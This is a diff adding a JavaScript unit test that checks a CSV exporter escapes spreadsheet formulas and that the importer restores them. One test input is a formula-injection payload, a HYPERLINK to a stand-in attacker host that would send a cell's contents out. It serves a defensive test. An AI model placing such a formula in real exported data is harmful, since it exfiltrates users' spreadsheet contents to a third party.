@@ -19,3 +19,12 @@ test("CSV importer handles blank lines, trimmed headers and missing columns", ()
   assert.deepEqual(parseCSV("id,title\n"), []);
   assert.deepEqual(parseCSV(""), []);
 });
+test("CSV exporter neutralises spreadsheet formulas and the importer restores them", () => {
+  assert.equal(csvEscape('=HYPERLINK("https://evil.example/?"&A1)'), `"'=HYPERLINK(""https://evil.example/?""&A1)"`);
+  assert.equal(csvEscape("+1"), "'+1");
+  assert.equal(csvEscape("@SUM(A1)"), "'@SUM(A1)");
+  assert.equal(csvEscape("a\rb"), '"a\rb"');
+  assert.equal(csvEscape("2026-10-01"), "2026-10-01");
+  const title = "- buy milk";
+  assert.deepEqual(parseCSV(`id,title\n1,${csvEscape(title)}\n`), [{ id: "1", title }]);
+});
